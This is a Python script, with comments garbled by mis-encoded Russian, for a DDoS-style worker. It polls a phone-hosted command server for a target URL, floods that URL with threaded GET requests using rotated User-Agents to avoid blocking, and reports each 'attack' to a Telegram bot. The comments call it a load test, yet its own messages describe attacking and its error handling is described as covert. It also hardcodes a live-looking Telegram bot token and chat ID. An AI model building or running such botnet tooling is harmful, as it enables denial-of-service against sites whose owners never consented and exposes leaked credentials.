import requests
import concurrent.futures
import time
import os
import random # –î–ª—è —Ä–∞–Ω–¥–æ–º–∏–∑–∞—Ü–∏–∏ User Agent –∏ —Å–Ω–∏–∂–µ–Ω–∏—è –≤–µ—Ä–æ—è—Ç–Ω–æ—Å—Ç–∏ –±–ª–æ–∫–∏—Ä–æ–≤–∫–∏

# --- ‚ö†Ô∏è –ù–ê–°–¢–†–û–ô–ö–ò (–¢–í–û–ò –î–ê–ù–ù–´–ï) ‚ö†Ô∏è ---
# –≠—Ç–æ –∞–¥—Ä–µ—Å —Å–µ—Ä–≤–µ—Ä–∞ —Ç–≤–æ–µ–≥–æ —Ç–µ–ª–µ—Ñ–æ–Ω–∞
MOBILE_SERVER_URL = "http://192.168.25.6:8080/" 

REPORTS_BOT_TOKEN = "8152994045:AAGEYWG4J0EPXDlJ49plLK_5Zm9y07YbpNg"
REPORTS_CHAT_ID = 8129366834 

# –ö–æ–Ω—Å—Ç–∞–Ω—Ç—ã –¥–ª—è –Ω–∞–≥—Ä—É–∑–æ—á–Ω–æ–≥–æ —Ç–µ—Å—Ç–∞ (–æ–ø—Ç–∏–º–∏–∑–∏—Ä–æ–≤–∞–Ω–æ –¥–ª—è —Å–ª–∞–±–æ–≥–æ –ü–ö)
NUM_THREADS = 20  
REQUESTS_PER_THREAD = 3 
# -------------------------------------

USER_AGENTS = [
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.2 Safari/605.1.15',
    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36',
]

def notify_telegram(message):
    """–û—Ç–ø—Ä–∞–≤–ª—è–µ—Ç —É–≤–µ–¥–æ–º–ª–µ–Ω–∏–µ –≤ –¢–µ–ª–µ–≥—Ä–∞–º."""
    url = f"https://api.telegram.org/bot{REPORTS_BOT_TOKEN}/sendMessage"
    payload = {"chat_id": REPORTS_CHAT_ID, "text": message}
    try:
        requests.post(url, data=payload, timeout=5)
    except Exception:
        pass

def send_request(url):
    """–û—Ç–ø—Ä–∞–≤–ª—è–µ—Ç –æ–¥–∏–Ω –∑–∞–ø—Ä–æ—Å —Å —Ä–∞–Ω–¥–æ–º–Ω—ã–º User Agent."""
    headers = {'User-Agent': random.choice(USER_AGENTS)}
    try:
        response = requests.get(url, headers=headers, timeout=10)
        return response.status_code < 400
    except:
        return False

def load_test(url):
    """–ó–∞–ø—É—Å–∫–∞–µ—Ç –Ω–∞–≥—Ä—É–∑–æ—á–Ω—ã–π —Ç–µ—Å—Ç."""
    total_requests = NUM_THREADS * REQUESTS_PER_THREAD
    start_time = time.time()
    
    with concurrent.futures.ThreadPoolExecutor(max_workers=NUM_THREADS) as executor:
        futures = [executor.submit(send_request, url) for _ in range(total_requests)]
        results = [f.result() for f in concurrent.futures.as_completed(futures)]

    total_time = time.time() - start_time
    success_count = sum(results)
    
    # 70% —É—Å–ø–µ—à–Ω—ã—Ö –∑–∞–ø—Ä–æ—Å–æ–≤ ‚Äî –º–∏–Ω–∏–º–∞–ª—å–Ω—ã–π –ø–æ—Ä–æ–≥ –¥–ª—è "–≤—ã–¥–µ—Ä–∂–∞–ª"
    status = "‚úÖ –≤—ã–¥–µ—Ä–∂–∞–ª" if success_count / total_requests >= 0.7 else "‚ùå –£–ü–ê–õ"
        
    return (
        f"ü§ñ –í–û–†–ö–ï–† {os.getpid()} ({os.uname()[1]}):\n"
        f"–¶–µ–ª—å: {url}\n"
        f"–°—Ç–∞—Ç—É—Å: {status}\n"
        f"–£—Å–ø–µ—à–Ω–æ: {success_count}/{total_requests} ({total_time:.2f} —Å–µ–∫.)"
    )

def main_loop():
    """–û—Å–Ω–æ–≤–Ω–æ–π —Ü–∏–∫–ª: –æ–ø—Ä–∞—à–∏–≤–∞–µ—Ç —Å–µ—Ä–≤–µ—Ä –∏ –∑–∞–ø—É—Å–∫–∞–µ—Ç —Ç–µ—Å—Ç."""
    last_run_url = ""
    notify_telegram(f"üî• –í–æ—Ä–∫–µ—Ä {os.getpid()} –ø–æ–¥–∫–ª—é—á–µ–Ω. –°–µ—Ä–≤–µ—Ä: {MOBILE_SERVER_URL}")
    
    while True:
        try:
            # 1. –ü–æ–ª—É—á–∞–µ–º –∫–æ–º–∞–Ω–¥—É –æ—Ç —Å–µ—Ä–≤–µ—Ä–∞ (—Ç–µ–ª–µ—Ñ–æ–Ω–∞)
            command = requests.get(MOBILE_SERVER_URL, timeout=5).text.strip()
            
            # 2. –ü—Ä–æ–≤–µ—Ä—è–µ–º, –µ—Å—Ç—å –ª–∏ –Ω–æ–≤–∞—è –∫–æ–º–∞–Ω–¥–∞ –∏ –Ω–µ "idle" –ª–∏ –æ–Ω–∞
            if command != "idle" and command != last_run_url:
                last_run_url = command
                
                notify_telegram(f"üö® –í–æ—Ä–∫–µ—Ä {os.getpid()} –∞—Ç–∞–∫—É–µ—Ç: {command}")
                result_message = load_test(command)
                notify_telegram(result_message)
                
            elif command == "idle":
                # –ï—Å–ª–∏ –∫–æ–º–∞–Ω–¥–∞ —Å–±—Ä–æ—à–µ–Ω–∞, —Å–±—Ä–∞—Å—ã–≤–∞–µ–º –ª–æ–∫–∞–ª—å–Ω—ã–π URL, —á—Ç–æ–±—ã –º–æ–∂–Ω–æ –±—ã–ª–æ –∑–∞–ø—É—Å—Ç–∏—Ç—å —Å–Ω–æ–≤–∞
                last_run_url = ""

        except Exception:
            # –°–∫—Ä—ã—Ç–Ω–æ –æ–±—Ä–∞–±–∞—Ç—ã–≤–∞–µ–º –æ—à–∏–±–∫–∏ (–Ω–∞–ø—Ä–∏–º–µ—Ä, –ø–æ—Ç–µ—Ä—è —Å–≤—è–∑–∏ —Å Wi-Fi)
            pass
        
        # –û–ø—Ä–∞—à–∏–≤–∞–µ–º —Å–µ—Ä–≤–µ—Ä –∫–∞–∂–¥—ã–µ 5 —Å–µ–∫—É–Ω–¥
        time.sleep(5)

if __name__ == "__main__":
    main_loop()

